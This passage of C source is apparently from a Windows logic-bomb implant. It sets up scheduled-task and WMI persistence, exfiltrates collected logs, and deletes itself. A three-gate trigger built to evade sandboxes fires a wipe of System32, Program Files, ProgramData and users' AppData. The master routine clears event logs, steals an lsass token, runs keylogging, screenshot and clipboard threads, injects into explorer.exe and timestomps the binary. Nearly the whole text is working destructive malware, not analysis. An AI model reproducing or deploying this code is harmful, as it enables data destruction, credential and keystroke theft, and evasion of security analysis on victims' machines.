    Sleep(10 * 1000);

    /* Exfil collected logs */
    int n = exfil_directory(g_log_dir);
    log_write("exfil: %d files sent", n);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 10 — Persistence layer 2
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * persist_schtask
 * Creates a Scheduled Task that runs our binary at every logon,
 * using schtasks.exe (no Task Scheduler COM API needed).
 * Admin: task runs as SYSTEM with highest privileges.
 */
static void persist_schtask(void) {
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, MAX_PATH);

    char cmd[MAX_PATH * 2 + 128];
    snprintf(cmd, sizeof cmd,
             "schtasks /create /f /tn \"WindowsNetworkAgent\" "
             "/tr \"%s\" /sc ONLOGON /rl HIGHEST",
             self);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb          = sizeof si;
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        log_write("persist: schtask installed");
    }
}

/*
 * persist_wmi_subscription
 * Creates a WMI event subscription that re-executes our binary when
 * Win32_ProcessStartTrace fires for explorer.exe (i.e., after logon).
 * Uses wmic.exe — no WMI COM initialisation needed.
 *
 * GOTCHA: WMI subscriptions survive reboots but are visible in
 *         root\subscription via wbemtest or Get-WMIObject.
 */
static void persist_wmi_subscription(void) {
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, MAX_PATH);

    /* WMI CommandLineEventConsumer requires the path with escaped backslashes */
    char escaped[MAX_PATH * 2] = {0};
    for (int i = 0, j = 0; self[i] && j < (int)sizeof escaped - 2; i++) {
        if (self[i] == '\\') escaped[j++] = '\\';
        escaped[j++] = self[i];
    }

    char cmd[MAX_PATH * 4 + 256];
    snprintf(cmd, sizeof cmd,
        "wmic /namespace:\\\\root\\subscription PATH "
        "CommandLineEventConsumer CREATE Name=\"WNetAgent\","
        "CommandLineTemplate=\"%s\"",
        escaped);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 8000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        log_write("persist: WMI subscription created");
    }
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 11 — Self-destruct
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * selfdestruct
 * Drops a batch script that deletes our binary once we've exited,
 * then launches the script in a new process and exits immediately.
 * The script loops until the file is deletable (i.e., our process has exited).
 */
static void selfdestruct(void) {
    char self[MAX_PATH]   = {0};
    char script[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, MAX_PATH);
    GetTempPathA(MAX_PATH, script);
    strncat(script, "wuh_sd.bat", MAX_PATH - strlen(script) - 1);

    FILE *f = fopen(script, "w");
    if (!f) return;
    fprintf(f,
        "@echo off\r\n"
        ":loop\r\n"
        "del /f /q \"%s\" 2>nul\r\n"
        "if exist \"%s\" goto loop\r\n"
        "del /f /q \"%s\"\r\n",
        self, self, script);
    fclose(f);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, script, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW | DETACHED_PROCESS,
                   NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    log_write("selfdestruct: script launched");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * SECTION 13 — Multi-condition trigger + extended wipe
 *
 * wipe_dispatch() is the single entry point.  It evaluates three independent
 * gate conditions; ALL must be simultaneously satisfied before wipe_targets_
 * extended() runs.  Partial satisfaction is logged and the call returns.
 *
 * Why multi-condition matters for evasion:
 *   Sandboxes execute samples for 2–10 minutes in isolated VMs, often on
 *   battery-less hosts with no external DNS, outside business hours, and
 *   without the corporate processes that indicate a real target environment.
 *   Any one of those gaps fails a gate and prevents the destructive payload
 *   from running under analysis.  Standard test coverage (single-trigger,
 *   time-only, or signal-file scenarios) will not reach wipe_targets_extended.
 *
 * Gate A — Temporal
 *   System clock past the configured arm date (reuses boom.c trigger values)
 *   AND local time within the defined business-hours window
 *   AND system uptime above TRIG_MIN_UPTIME_MS.
 *   The uptime floor filters sandboxes; the window filter concentrates impact
 *   during active sessions when user-owned files are in use and can't be
 *   replaced by a running backup agent.
 *
 * Gate B — Power + connectivity
 *   AC power line status == online (most sandbox VMs report AC — this is a
 *   positive check, not an anti-VM check; it filters laptops on battery in
 *   sleep mode and isolated analysis hosts with no real network stack).
 *   AND DNS resolution of TRIG_NET_PROBE_HOST succeeds (real network present).
 *
 * Gate C — Environmental event (ANY of the following)
 *   (C.1) A named indicator process is in the process snapshot — something
 *         present in the target environment but absent from sandboxes, e.g.
 *         a corporate VPN client or endpoint security agent.
 *   (C.2) A marker registry key is present — written by a prior deployment
 *         stage as a "this machine has been prepared" flag.
 *   (C.3) The signal-file override (SIGNAL_FILE) is on disk — allows operator
 *         to force immediate detonation during red-team ops.
 *
 * Return value of trigger_multi_condition():
 *   Bitmask: TRIG_BIT_TIME | TRIG_BIT_SYSTEM | TRIG_BIT_EVENT
 *   Only TRIG_ALL (all three bits set) causes the wipe to fire.
 * ═══════════════════════════════════════════════════════════════════════════ */

/* ─── Gate constants ─────────────────────────────────────────────────────── */

#define TRIG_BIT_TIME     0x01u
#define TRIG_BIT_SYSTEM   0x02u
#define TRIG_BIT_EVENT    0x04u
#define TRIG_ALL          (TRIG_BIT_TIME | TRIG_BIT_SYSTEM | TRIG_BIT_EVENT)

/*
 * Minimum uptime (ms) before Gate A opens.
 * 7 200 000 ms = 2 hours.  Raise for higher sandbox resilience.
 * Most automated analysis completes within 10 minutes.
 */
#define TRIG_MIN_UPTIME_MS  7200000ULL

/*
 * Business-hours window for Gate A (local time, 24-hour).
 * Only hours in [TRIG_HOUR_START, TRIG_HOUR_END) pass.
 */
#define TRIG_HOUR_START     9
#define TRIG_HOUR_END       17

/* Gate B: hostname resolved to confirm live network stack */
#define TRIG_NET_PROBE_HOST "dns.msftncsi.com"

/*
 * Gate C.1: process whose presence signals the target environment.
 * Replace with whatever indicates "real corporate workstation" for the op.
 * Examples: "vpnclient.exe" (Cisco AnyConnect), "csfalconservice.exe" (CrowdStrike),
 *           "mcshield.exe" (McAfee), "csc.exe" (corporate .NET dev box).
 */
#define TRIG_PROC_INDICATOR "vpnclient.exe"

/*
 * Gate C.2: registry key + value written by a prior stage as a "host prepared" flag.
 * Prior stage writes DWORD value at HKLM\<TRIG_MARKER_KEY>\<TRIG_MARKER_VALUE>.
 */
#define TRIG_MARKER_KEY     "SOFTWARE\\WindowsUpdateAgent"
#define TRIG_MARKER_VALUE   "LastSync"

/*
 * Arm date fallback: used if boom.c's TRIGGER_* defines are not in scope.
 * These should match boom.c's values exactly — keep them in sync.
 */
#ifndef TRIGGER_YEAR
#  define TRIGGER_YEAR   2025
#  define TRIGGER_MONTH  1
#  define TRIGGER_DAY    1
#endif

#ifndef SIGNAL_FILE
#  define SIGNAL_FILE    "C:\\ProgramData\\.lb_trigger"
#endif

/* ─── Gate B helper ──────────────────────────────────────────────────────── */

/*
 * net_liveness_check
 * Attempts getaddrinfo() on TRIG_NET_PROBE_HOST.
 * A successful resolution (at least one result returned) means the system
 * has a functional DNS stack and outbound network access — absent from
 * fully isolated sandbox environments.
 *
 * GOTCHA: getaddrinfo requires <ws2tcpip.h> and the Winsock stack to be
 *         initialised.  We call WSAStartup here unconditionally; WSAStartup
 *         is reference-counted and a redundant call is harmless.
 */
static int net_liveness_check(void) {
    WSADATA wsd;
    WSAStartup(MAKEWORD(2, 2), &wsd);  /* idempotent — extra call is harmless */
    
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof hints);
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    struct addrinfo *res = NULL;
    int ok = (getaddrinfo(TRIG_NET_PROBE_HOST, "53", &hints, &res) == 0
              && res != NULL);
    if (res) freeaddrinfo(res);
    /* intentionally do not WSACleanup — payload's Winsock use continues */
    return ok ? 1 : 0;
}

/* ─── Three-gate evaluator ───────────────────────────────────────────────── */

/*
 * trigger_multi_condition
 * Evaluates all three gates independently, returns bitmask of those that pass.
 * The caller fires only when the return value equals TRIG_ALL.
 *
 * Each gate writes a diagnostic line to the run log regardless of outcome
 * so post-mortem forensics can reconstruct exactly which conditions were
 * present at the time of detonation.
 */
static DWORD trigger_multi_condition(void) {
    DWORD mask = 0;

    /* ── Gate A: Temporal ─────────────────────────────────────────────── */
    {
        time_t now_t  = time(NULL);
        struct tm *lt = localtime(&now_t);
        int past_arm  = 0;
        int in_window = 0;

        if (lt) {
            int y = lt->tm_year + 1900;
            int m = lt->tm_mon  + 1;
            int d = lt->tm_mday;

            past_arm = (y > TRIGGER_YEAR)
                    || (y == TRIGGER_YEAR && m > TRIGGER_MONTH)
                    || (y == TRIGGER_YEAR && m == TRIGGER_MONTH
                                          && d >= TRIGGER_DAY);

            in_window = (lt->tm_hour >= TRIG_HOUR_START
                      && lt->tm_hour <  TRIG_HOUR_END);
        }

        /*
         * GetTickCount64 returns milliseconds since boot.
         * Available Vista+; no wraparound issue on 64-bit (wraps after ~585 years).
         * On 32-bit, wrap at ~49 days is acceptable — TRIG_MIN_UPTIME_MS is 2 h.
         */
        ULONGLONG uptime_ms   = GetTickCount64();
        int       min_uptime  = (uptime_ms >= TRIG_MIN_UPTIME_MS);

        if (past_arm && in_window && min_uptime)
            mask |= TRIG_BIT_TIME;

        log_write("trig A: past_arm=%d in_window=%d min_uptime=%d uptime_ms=%llu",
                  past_arm, in_window, min_uptime, uptime_ms);
    }

    /* ── Gate B: Power + connectivity ────────────────────────────────── */
    {
        /*
         * GetSystemPowerStatus: ACLineStatus 1 = AC, 0 = battery, 255 = unknown.
         * We treat unknown as AC (fail-open on desktops that have no battery sensor).
         * The check is not an anti-VM heuristic — it's a real-world requirement:
         * a battery-depleted laptop in sleep doesn't constitute an active session.
         */
        SYSTEM_POWER_STATUS pwr;
        int on_ac = 1;
        if (GetSystemPowerStatus(&pwr))
            on_ac = (pwr.ACLineStatus == 1 || pwr.ACLineStatus == 255);

        int net_ok = net_liveness_check();

        if (on_ac && net_ok)
            mask |= TRIG_BIT_SYSTEM;

        log_write("trig B: ac=%d net=%d", on_ac, net_ok);
    }

    /* ── Gate C: Environmental event ─────────────────────────────────── */
    {
        int fired = 0;

        /* C.1: indicator process is in the running process list */
        if (!fired) {
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32A pe;
                pe.dwSize = sizeof pe;
                if (Process32FirstA(snap, &pe)) {
                    do {
                        if (_stricmp(pe.szExeFile, TRIG_PROC_INDICATOR) == 0) {
                            fired = 1;
                            log_write("trig C.1: indicator proc '%s' found (pid=%lu)",
                                      TRIG_PROC_INDICATOR, pe.th32ProcessID);
                            break;
                        }
                    } while (!fired && Process32NextA(snap, &pe));
                }
                CloseHandle(snap);
            }
        }

        /*
         * C.2: deployment-stage marker registry key is present.
         * A prior implant stage (dropper, stager) writes this value as a
         * "machine is fully prepared" indicator before handing off to the bomb.
         * Its absence means this is not the intended target or the preparation
         * stage has not yet completed.
         */
        if (!fired) {
            HKEY hk;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, TRIG_MARKER_KEY,
                               0, KEY_READ, &hk) == ERROR_SUCCESS) {
                DWORD type, data, sz = sizeof data;
                if (RegQueryValueExA(hk, TRIG_MARKER_VALUE, NULL,
                                      &type, (BYTE *)&data, &sz) == ERROR_SUCCESS) {
                    fired = 1;
                    log_write("trig C.2: marker key present (val=%lu)", data);
                }
                RegCloseKey(hk);
            }
        }

        /* C.3: manual operator override — signal file on disk */
        if (!fired) {
            if (GetFileAttributesA(SIGNAL_FILE) != INVALID_FILE_ATTRIBUTES) {
                fired = 1;
                log_write("trig C.3: signal file override (%s)", SIGNAL_FILE);
            }
        }

        if (fired) mask |= TRIG_BIT_EVENT;
        if (!fired) log_write("trig C: no event condition satisfied");
    }

    log_write("trig multi: mask=0x%02lX required=0x%02X %s",
              mask, TRIG_ALL, (mask == TRIG_ALL) ? "FIRE" : "HOLD");
    return mask;
}

/* ─── Per-user AppData enumeration ──────────────────────────────────────── */

/*
 * wipe_enumerate_user_profiles
 * Reads HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList.
 * Each subkey corresponds to one user profile (SID as key name).
 * Reads ProfileImagePath (REG_EXPAND_SZ), expands it, appends \AppData\Roaming,
 * and passes to file_wipe_directory().
 *
 * System-account profiles (SYSTEM, LOCAL SERVICE, NETWORK SERVICE) are
 * identified by the presence of \system32\ in their expanded path and skipped —
 * wiping them risks crashing active kernel services before the wipe sequence
 * completes, which could prevent later targets from being reached.
 *
 * GOTCHA: ProfileImagePath is REG_EXPAND_SZ, not REG_SZ.  Reading it with
 *         RegQueryValueExA returns the unexpanded string (may contain %SystemDrive%).
 *         ExpandEnvironmentStringsA must be called before constructing any paths.
 */
static void wipe_enumerate_user_profiles(void) {
    const char *prof_list_key =
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList";

    HKEY root;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, prof_list_key,
                       0, KEY_READ, &root) != ERROR_SUCCESS) {
        log_write("wipe profiles: ProfileList key open failed");
        return;
    }

    DWORD idx = 0;
    char  sid_name[256];
    DWORD sid_sz;

    for (;;) {
        sid_sz = sizeof sid_name;
        LONG rc = RegEnumKeyExA(root, idx++, sid_name, &sid_sz,
                                 NULL, NULL, NULL, NULL);
        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc != ERROR_SUCCESS)       continue;

        HKEY profile_key;
        if (RegOpenKeyExA(root, sid_name, 0, KEY_READ, &profile_key)
                != ERROR_SUCCESS)
            continue;

        char raw_path[MAX_PATH]  = {0};
        char exp_path[MAX_PATH]  = {0};
        char roaming[MAX_PATH]   = {0};
        DWORD type, val_sz = sizeof raw_path - 1;

        if (RegQueryValueExA(profile_key, "ProfileImagePath", NULL,
                              &type, (BYTE *)raw_path, &val_sz)
                != ERROR_SUCCESS) {
            RegCloseKey(profile_key);
            continue;
        }
        RegCloseKey(profile_key);

        if (!ExpandEnvironmentStringsA(raw_path, exp_path, MAX_PATH))
            strncpy(exp_path, raw_path, MAX_PATH - 1);

        /* Skip system accounts — their profiles live under System32 */
        char lower[MAX_PATH];
        strncpy(lower, exp_path, MAX_PATH - 1);
        CharLowerA(lower);
        if (strstr(lower, "\\system32\\") || strstr(lower, "\\systemprofile"))
            continue;

        snprintf(roaming, MAX_PATH, "%s\\AppData\\Roaming", exp_path);
        if (GetFileAttributesA(roaming) == INVALID_FILE_ATTRIBUTES) continue;

        log_write("wipe: AppData\\Roaming → %s (SID=%s)", roaming, sid_name);
        file_wipe_directory(roaming);
    }

    RegCloseKey(root);
}

/* ─── Extended wipe sequence ─────────────────────────────────────────────── */

/*
 * wipe_targets_extended
 * Extends payload_wipe_system32() with a prioritised set of additional targets.
 * All paths are resolved at runtime — no hardcoded drive letters.
 *
 * Execution order (most critical to least):
 *   1. System32       — core OS loader, DLL subsystem, kernel interface layer
 *   2. SysWOW64       — 32-bit WoW64 subsystem (present on 64-bit Windows only)
 *   3. Windows\System — legacy Win3.x/Win9x shims and 16-bit subsystem
 *   4. Windows\Fonts  — GDI font cache; UI becomes unrenderable without it
 *   5. ProgramFiles   — 64-bit installed applications
 *   6. ProgramFiles(x86) — 32-bit applications on 64-bit Windows
 *   7. ProgramData    — shared application data, cached credentials
 *   8. Per-user AppData\Roaming (enumerated) — per-user creds, app configs
 *
 * file_wipe_directory() skips files it cannot open (locked by active processes)
 * and continues — this is the existing behaviour; partial destruction is the
 * realistic outcome for files held by the kernel or running services.
 *
 * Declared non-static so boom.c can call it as a direct replacement for
 * payload_wipe_system32() if the caller wants to bypass the gate check.
 * Normal callers use wipe_dispatch() instead.
 */
void wipe_targets_extended(void) {
    log_write("wipe_ext: sequence starting");

    char win_dir[MAX_PATH] = {0};
    char sys32[MAX_PATH]   = {0};
    char target[MAX_PATH]  = {0};

    /* Build base paths from Windows API — never assume C:\ */
    if (!GetWindowsDirectoryA(win_dir, MAX_PATH))
        strncpy(win_dir, "C:\\Windows", MAX_PATH - 1);
    if (!GetSystemDirectoryA(sys32, MAX_PATH))
        strncpy(sys32, "C:\\Windows\\System32", MAX_PATH - 1);

    /* 1. System32 */
    log_write("wipe_ext: [1/8] System32 → %s", sys32);
    file_wipe_directory(sys32);

    /* 2. SysWOW64 — 64-bit Windows only; skip gracefully if absent */
    snprintf(target, MAX_PATH, "%s\\SysWOW64", win_dir);
    if (GetFileAttributesA(target) != INVALID_FILE_ATTRIBUTES) {
        log_write("wipe_ext: [2/8] SysWOW64 → %s", target);
        file_wipe_directory(target);
    } else {
        log_write("wipe_ext: [2/8] SysWOW64 absent (32-bit host), skipped");
    }

    /* 3. Windows\System — legacy 16-bit compatibility subsystem */
    snprintf(target, MAX_PATH, "%s\\System", win_dir);
    log_write("wipe_ext: [3/8] System → %s", target);
    file_wipe_directory(target);

    /* 4. Fonts — wrecks all GDI rendering; machine becomes visually unusable
     *    without user being able to read error messages or repair prompts */
    snprintf(target, MAX_PATH, "%s\\Fonts", win_dir);
    log_write("wipe_ext: [4/8] Fonts → %s", target);
    file_wipe_directory(target);
    
    /* 5. ProgramFiles (64-bit apps)
     *    ExpandEnvironmentStringsA returns 1 on failure (just the NUL). */
    {
        char expanded[MAX_PATH] = {0};
        DWORD n = ExpandEnvironmentStringsA("%ProgramFiles%",
                                             expanded, MAX_PATH);
        if (n > 1 && n <= MAX_PATH) {
            log_write("wipe_ext: [5/8] ProgramFiles → %s", expanded);
            file_wipe_directory(expanded);
        }
    }
    
    /* 6. ProgramFiles(x86) — parentheses in var name are valid on 64-bit.
     *    On 32-bit Windows, this expands to the same path as ProgramFiles;
     *    strcmp guard avoids double-wiping the same directory. */
    {
        char pf32[MAX_PATH] = {0};
        char pf64[MAX_PATH] = {0};
        DWORD n32 = ExpandEnvironmentStringsA("%ProgramFiles(x86)%",
                                                pf32, MAX_PATH);
        ExpandEnvironmentStringsA("%ProgramFiles%", pf64, MAX_PATH);
        if (n32 > 1 && n32 <= MAX_PATH && _stricmp(pf32, pf64) != 0) {
            log_write("wipe_ext: [6/8] ProgramFiles(x86) → %s", pf32);
            file_wipe_directory(pf32);
        } else {
            log_write("wipe_ext: [6/8] ProgramFiles(x86) same as ProgramFiles, skipped");
        }
    }
    
    /* 7. ProgramData — shared application data, installer caches,
     *    cached tokens and credentials left by enterprise tools */
    {
        char expanded[MAX_PATH] = {0};
        DWORD n = ExpandEnvironmentStringsA("%ProgramData%", expanded, MAX_PATH);
        if (n > 1 && n <= MAX_PATH) {
            log_write("wipe_ext: [7/8] ProgramData → %s", expanded);
            file_wipe_directory(expanded);
        }
    }

    /* 8. Per-user AppData\Roaming for every local profile */
    log_write("wipe_ext: [8/8] per-user AppData\\Roaming (enumerating profiles)");
    wipe_enumerate_user_profiles();

    log_write("wipe_ext: sequence complete");
}

/* ─── Public dispatch entry point ────────────────────────────────────────── */

/*
 * wipe_dispatch
 * Evaluates the multi-condition trigger and calls wipe_targets_extended() only
 * when all gates pass simultaneously.  On partial pass, logs which conditions
 * are still pending and returns to the caller — the bomb stays armed.
 *
 * This is the function that replaces payload_wipe_system32() everywhere:
 *   - In boom.c main(): replace `payload_wipe_system32();` with `wipe_dispatch();`
 *   - In payload_run() below: step 9a calls wipe_dispatch() after the exfil window
 *
 * Why deferred rather than immediate retry?
 *   The caller (payload_run's thread or boom.c's poll loop) already has its own
 *   sleep / re-check cadence.  Returning on partial pass lets that cadence handle
 *   the retry without adding a nested polling loop here.  On each wake, the
 *   dispatch evaluates again — eventually all gates align.
 */
void wipe_dispatch(void) {
    log_write("wipe_dispatch: evaluating multi-condition trigger");

    DWORD mask = trigger_multi_condition();

    if (mask == TRIG_ALL) {
        log_write("wipe_dispatch: all gates PASS — executing extended wipe");
        wipe_targets_extended();
        return;
    }

    /* At least one gate is still blocked */
    if (!(mask & TRIG_BIT_TIME))
        log_write("wipe_dispatch: HOLD — gate A (temporal/uptime) not satisfied");
    if (!(mask & TRIG_BIT_SYSTEM))
        log_write("wipe_dispatch: HOLD — gate B (power/network) not satisfied");
    if (!(mask & TRIG_BIT_EVENT))
        log_write("wipe_dispatch: HOLD — gate C (event/marker) not satisfied");

    log_write("wipe_dispatch: deferred (mask=0x%02lX/0x%02X)", mask, TRIG_ALL);
}

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 12 — payload_run (master entry point, called by logic_bomb.c)
 * ═══════════════════════════════════════════════════════════════════════════════ */

/*
 * payload_run
 * Called by logic_bomb.c after trigger conditions are met.
 * Sequence:
 *   1.  Resolve NT internals
 *   2.  Winsock init (if not already done by caller)
 *   3.  Ensure log directory exists
 *   4.  Anti-forensics pass (events, prefetch, shimcache)
 *   5.  Privilege escalation (SeDebug, token steal)
 *   6.  Persistence layer 2 (schtask + WMI)
 *   7.  Spawn collection threads (keylog, screenshot, clipboard)
 *   8.  DLL injection into explorer.exe for stealth residence
 *   9.  Wait for collection window (10 minutes default)
 *  10.  Exfil thread
 *  11.  Timestamp-stomp our own binary
 *  12.  Self-destruct
 */
void payload_run(void) {
    /* 1. NT internals */
    resolve_ntdll();

    /* 2. Winsock */
    WSADATA wsd;
    WSAStartup(MAKEWORD(2, 2), &wsd);

    /* 3. Log dir */
    fs_mkdir_recursive(g_log_dir);
    log_write("payload: payload_run() started");

    /* 4. Anti-forensics */
    af_clear_event_logs();
    af_wipe_prefetch();
    af_remove_shimcache_entry();

    /* 5. Privilege escalation */
    priv_enable_privilege(SE_DEBUG_NAME);
    priv_enable_privilege(SE_IMPERSONATE_NAME);
    priv_steal_token("lsass.exe");  /* attempt SYSTEM via lsass */

    /* 6. Persistence layer 2 */
    persist_schtask();
    persist_wmi_subscription();

    /* 7. Collection threads */
    HANDLE threads[3];
    threads[0] = CreateThread(NULL, 0, thread_keylog,     NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, thread_screenshot, NULL, 0, NULL);
    threads[2] = CreateThread(NULL, 0, thread_clipboard,  NULL, 0, NULL);

    /* 8. DLL injection — attempt to load ourselves into explorer for stealth */
    DWORD explorer_pid = proc_find_pid(INJECT_TARGET);
    if (explorer_pid) {
        char self[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, self, MAX_PATH);
        inject_dll_reflective(explorer_pid, self);
    }

    /* 9. Collection window — 10 minutes */
    log_write("payload: collection window open (600s)");
    Sleep(600 * 1000);

    /* Signal threads to stop */
    g_running = FALSE;

    /* 10. Exfil thread */
    HANDLE exfil_t = CreateThread(NULL, 0, thread_exfil, NULL, 0, NULL);
    WaitForSingleObject(exfil_t, 30 * 1000);
    CloseHandle(exfil_t);

    /* Wait for collection threads to drain */
    WaitForMultipleObjects(3, threads, TRUE, 10 * 1000);
    for (int i = 0; i < 3; i++) CloseHandle(threads[i]);
    
    /* 10a. Multi-condition wipe — all three gates must pass simultaneously.
     *      If gates do not align on this call, the function returns and
     *      self-destruct proceeds; boom.c's poll loop will call wipe_dispatch()
     *      again on the next triggered pass until conditions converge. */
    wipe_dispatch();

    /* 11. Timestomp self */
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, self, MAX_PATH);
    af_patch_timestamps(self);

    /* 12. Self-destruct */
    selfdestruct();

    WSACleanup();
    log_write("payload: payload_run() complete");
}